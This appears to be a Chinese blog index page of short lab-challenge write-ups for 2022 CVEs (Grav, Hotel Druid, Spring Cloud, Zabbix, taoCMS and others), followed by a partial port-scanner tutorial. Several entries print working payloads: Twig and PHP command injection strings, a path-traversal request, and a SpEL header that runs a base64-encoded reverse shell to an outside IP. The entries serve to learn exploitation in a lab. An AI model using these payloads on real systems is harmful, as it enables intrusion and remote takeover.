-<p><strong>locale</strong> ： 语言库</p>
-<h1 id="打k插件"><a href="#打k插件" class="headerlink" title="打k插件"></a>打k插件</h1><p>自行安装，后面会用到<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Seekladoom/article/details/104235193">https://blog.csdn.net/Seekladoom/article/details/104235193</a></p>
-<h1 id="Karaoke"><a href="#Karaoke" class="headerlink" title="Karaoke"></a>Karaoke</h1><p><strong>作用</strong> ： 划分音节和时间<br><strong>规范</strong> ： 标识符 | 标点<code>&#123;\k1&#125;</code><br><strong>k标签</strong> ：<code>&#123;\k$&#125;</code><br><code>&#123;&#125;</code> : aeg标记<code>&#123;&#125;</code>内的内容为特效区，<code>$</code> : 时间划分 单位是1<strong>cs</strong> &#x3D; 10ms;<br><code>ko</code> : 与k类似，但取消了字幕的边框<br><strong>特殊音节</strong> : <code>|</code> : 注音</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E7%89%B9%E6%95%88%E8%BD%B4%E5%85%A5%E9%97%A8/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-2073/">春秋云境-CVE-2022-2073</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Grav CMS 可以通过 Twig 来进行页面的渲染，使用了不安全的配置可以达到远程代码执行的效果，影响最新版 v1.7.34 以下的版本</p>
-<p>随便注册进入后台，在pages&#x2F;typography下的正文编辑插入payload：<code>&#123;&#123;['cat\x20/flag']|filter('system')&#125;&#125;</code>，保存访问&#x2F;typography，getflag</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-2073/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-22909/">春秋云境-CVE-2022-22909</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Hotel Druid RCE</p>
-<p>在rooms模块里修改room的名字为<code>&#123;$&#123;system($_REQUEST[cmd])&#125;&#125;</code>并提交，再访问<code>/dati/selectappartamenti.php</code>，传cmd&#x3D;id可以看到回显，执行任意命令。</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-22909/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-22947/">春秋云境-CVE-2022-22947</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）发生在Spring Cloud Gateway应用程序的Actuator端点，其在启用、公开和不安全的情况下容易受到代码注入的攻击。攻击者可通过该漏洞恶意创建允许在远程主机上执行任意远程执行的请求。</p>
-<p>exp直接打，打印的结果不全，因为exp只选择打印filtet[0]，修改为filter[1]，就可以只打印<code>AddResponseHeader Result</code>的结果了</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-22947/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-22963/">春秋云境-CVE-2022-22963</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：SpringCloudFunction是SpringBoot开发的一个Servless中间件（FAAS），支持基于SpEL的函数式动态路由。当Spring Cloud Function 启用动态路由functionRouter时， HTTP请求头spring.cloud.function.routing-expression参数存在SPEL表达式注入漏洞，攻击者可通过该漏洞进行远程命令执行。 P.S 卡慢不影响拿flag</p>
-<p>进入容器，POST方法添加请求头</p>
-<p><code>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMC4xOTYuNjYuNDQvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</code></p>
-<p>反弹shell，因为很卡，所以狂发，只要成功一次就OK</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-22963/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-22965/">春秋云境-CVE-2022-22965</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Spring framework 是Spring 里面的一个基础开源框架，其目的是用于简化 Java 企业级应用的开发难度和开发周期,2022年3月31日，VMware Tanzu发布漏洞报告，Spring Framework存在远程代码执行漏洞，在 JDK 9+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定的远程代码执行 (RCE) 的攻击。</p>
-<p>从github找exp，直接打</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-22965/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-23134/">春秋云境-CVE-2022-23134</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</p>
-<p>Admin&#x2F;zabbix登陆在页面就有flag，非预期<br><img src="http://ayanagi.fun/post-images/1680239043052.png"><br>首先，这个题以前做过，利用的是CVE-2022-23131同样的原理进行登陆绕过，达成一个未授权访问，但是绕过之后到了配置数据库的步骤就没办法继续进行了，查阅了手册之类的发现大概是需要继续搭建环境，看一些文章是在搭环境的时候选择写入一个自己准备的恶意数据库用来覆盖靶机的数据库数据，难度是略高的，最后也就没做完<br>接下来也是非预期<br>在后台选择Administration-&gt;Scripts-&gt;Ping<img src="http://ayanagi.fun/post-images/1680239216311.png"><br>这里的Commands栏可以执行任意命令<br><img src="http://ayanagi.fun/post-images/1680239255141.png"><br>直接<code>cat ../../../../../../../../flag</code> -&gt;Update<br>接着进入Monitoring-&gt;Maps-&gt;Local network单击出现的交换机图标，有个Ping选项，选择<img src="http://ayanagi.fun/post-images/1680239352895.png"><br>getflag<br><img src="http://ayanagi.fun/post-images/1680239373239.png"></p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-23134/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-23316/">春秋云境-CVE-2022-23316</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：taoCMS v3.0.2 存在任意文件读取漏洞</p>
-<p>进入后台，文件管理→点编辑文件的时候抓包，修改目标文件路径可任意读(os:这么小一个cms竟然爆这么多CVE 属实是养活了一大批安全人员)</p>
-<p>源码的<code>File.php</code>有如下漏洞代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$table</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tpl</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$id</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;table=<span class="variable">$table</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;realpath=SYS_ROT.<span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tpl=<span class="keyword">new</span> <span class="title class_">Template</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$path</span>=<span class="variable language_">$this</span>-&gt;path;</span><br><span class="line">        <span class="variable">$filedata</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;realpath);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">myTpl</span>(<span class="string">&#x27;edit&#x27;</span>.<span class="variable">$this</span>-&gt;talbe));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>没有任何过滤，将可控的path传给了file_get_contents，导致任意文件读取</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-23316/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-23906/">春秋云境-CVE-2022-23906</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/PTE/" rel="tag">PTE</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <!--more-->
-
-<p>漏洞描述：CMS Made Simple v2.2.15 被发现包含通过上传图片功能的远程命令执行 (RCE) 漏洞。此漏洞通过精心制作的图像文件被利用。</p>
-<p>进入容器，弱口令：admin&#x2F;123456进入后台，跟着复现，内容→文件管理→上传图片马→用复制功能，目标文件名为1.php，访问getshell</p>
-
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-25099/">春秋云境-CVE-2022-25099</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：WBCE CMS v1.5.2 &#x2F;language&#x2F;install.php 文件存在漏洞，攻击者可精心构造文件上传造成RCE</p>
-<p>在&#x2F;admin路径下弱口令admin&#x2F;123456登陆后台，Add-ons模块的Languages上传有洞，去官网下cms源码，从里面的languages模块里随便拖一个出来，插入恶意代码，改后缀为txt，上传后可以执行里面的代码，实现RCE</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-25099/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-24263/">春秋云境-CVE-2022-24263</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Hospital Management System sqli</p>
-<p>注入点是doctor登陆的地方，输入账号密码login抓包，sqlmap梭</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-24263/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-23366/">春秋云境-CVE-2022-23366</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Hospital Management Startup 1.0 sqli</p>
-<p>login as admin处抓包，sqlmap梭</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-23366/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-25401/">春秋云境-CVE-2022-25401</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Cuppa CMS v1.0 administrator&#x2F;templates&#x2F;default&#x2F;html&#x2F;windows&#x2F;right.php文件存在任意文件读取漏洞</p>
-<p>访问<code>/templates/default/html/windows/right.php</code>，POST传payload：<code>id=1&amp;path=component%2Ftable_manager%2Fview%2Fcu_views&amp;uniqueClass=window_right_246232&amp;url=../../../../../../flag</code>，然后F12看见flag</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-25401/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-25411/">春秋云境-CVE-2022-25411</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：MaxSite CMS是俄国MaxSite CMS开源项目的一款网站内容管理系统。马克斯程序(MaxCMS)以开源、免费、功能强大、安全健壮、性能卓越、超级易用、模板众多、插件齐全等优势，受到众多企业和站长的喜爱。马克斯程序研发团队拥有多年的技术积累和产品开发经验，成立了官方技术支持团队、官方模板团队、官方插件团队。一切立足于站长利益、孜孜不倦的挖掘站长需求、不断提升产品体验，自主创新多项特色技术、提升网站品质!独立开发的管理员管理系统，可以对管理员进行更能人性化的管理网站。 Maxsite CMS存在文件上传漏洞，攻击者可利用该漏洞通过精心制作的PHP文件执行任意代码。账户为弱口令</p>
-<p>容器的响应速度有点拉。弱口令都试了一遍，全烂，难怪77个挑战只有13个过了</p>
-<p>过了好多天，看到网上有wp了，密码居然是admin888，intruder没相关字典那时候没爆出，很烦。登陆进后台就随便玩了</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-25411/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-26201/">春秋云境-CVE-2022-26201</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:05.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>漏洞描述：Victor CMS v1.0 存在二次注入漏洞</p>
-<p>sqlmap 读&#x2F;flag一把梭（不得不说i春秋的靶机质量一言难尽)</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2023/12/14/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-CVE-2022-26201/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2023/12/14/%E7%AE%80%E5%8D%95%E5%86%99%E4%B8%AA%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/">简单写个端口扫描器</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="http://example.com/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2023-12-14T03:33:04.000Z" itemprop="datePublished">2023-12-14</time>
-</a>
-
-            
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>写在前面：初稿写了一半停电了，啥都没了，也没心情搁那铺垫了。。。<br>总之，端口扫描器本身代码很简单，但是涉及了好多个面试重点关注的技术：python多线程，socket编程，tkinter图形化编程，正则表达式<br>以下是会用到的库，由于是标准库，在内网环境也完全可以使用</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tkinter.messagebox</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread,Lock</span><br><span class="line"><span class="keyword">import</span> sys,re</span><br></pre></td></tr></table></figure>
-
-<p>需求：输入ip，返回该ip一些端口的开放状态<br>那就要判断输入是否合法，IP需要的是<code>*.*.*.*</code>的形式，其中*代表数字</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Judgement_IP</span>(<span class="params">self</span>):</span><br><span class="line">    reg = <span class="string">&#x27;^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$&#x27;</span></span><br><span class="line">    ip = re.<span class="keyword">match</span>(reg, self.IP.get())</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        action(ip.group())</span><br><span class="line">        Port_open_content = Label(self.init_window_name, text = Port_is_open)</span><br><span class="line">        Port_open_content.grid(row = <span class="number">4</span>, column = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IP格式错误&quot;</span>)</span><br><span class="line">        tkinter.messagebox.showerror(<span class="string">&#x27;错误&#x27;</span>, <span class="string">&#x27;IP格式错误&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>写tkinter窗体时用到的方法:<br>title()： 设置窗体的名称<br><code>self.init_window_name.title(&#39;简单端口扫描工具&#39;)</code><br>geometry()： 设置窗体大小，四个值的顺序是：宽、高、位置x, y<br><code>self.init_window_name.geometry(&#39;300x600+150+150&#39;)</code><br>iconbitmap()： 设置窗体的图标<br><code>self.init_window_name.iconbitmap(&#39;icon.ico&#39;)</code><br>Label： 组件，用于在指定的窗口中显示文本和图像<br><code>label = Label(self.init_window_name, text=&quot;IP:&quot;, anchor=&#39;c&#39;).grid(row=0)</code><br>Entry：组件，文本框用来让用户输入一行文本字符串<br><code>self.IP = Entry(self.init_window_name)</code><br><code>self.IP.gird(row = 0, column = 1)</code></p>
-<p>完整代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> tkinter.messagebox</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread, Lock</span><br><span class="line"><span class="keyword">import</span> sys, re</span><br><span class="line"></span><br><span class="line">Port_is_open = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Port_Scan</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, init_window_name</span>):</span><br><span class="line">        self.init_window_name = init_window_name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_init_window</span>(<span class="params">self</span>):</span><br><span class="line">        self.init_window_name.title(<span class="string">&#x27;简单的端口扫描工具&#x27;</span>) <span class="comment">#设置窗体的名称</span></span><br><span class="line">        self.init_window_name.geometry(<span class="string">&#x27;300x600+150+150&#x27;</span>) <span class="comment">#设置窗体大小，四个值的顺序是：宽、高、位置x, y</span></span><br><span class="line">        self.init_window_name.iconbitmap(<span class="string">&#x27;icon.ico&#x27;</span>) <span class="comment">#设置窗体的图标</span></span><br><span class="line">        <span class="comment">#设置输入框Entry</span></span><br><span class="line">        label = Label(self.init_window_name, text=<span class="string">&quot;IP:&quot;</span>, anchor=<span class="string">&#x27;c&#x27;</span>).grid(row=<span class="number">0</span>)</span><br><span class="line">        self.IP = Entry(self.init_window_name)</span><br><span class="line">        self.IP.grid(row=<span class="number">0</span>, column=<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#设置扫描按钮</span></span><br><span class="line">        Button(self.init_window_name, text=<span class="string">&quot;开始扫描&quot;</span>, anchor=<span class="string">&#x27;c&#x27;</span>, command=self.Judgment_IP).grid(row=<span class="number">0</span>, column=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Judgment_IP</span>(<span 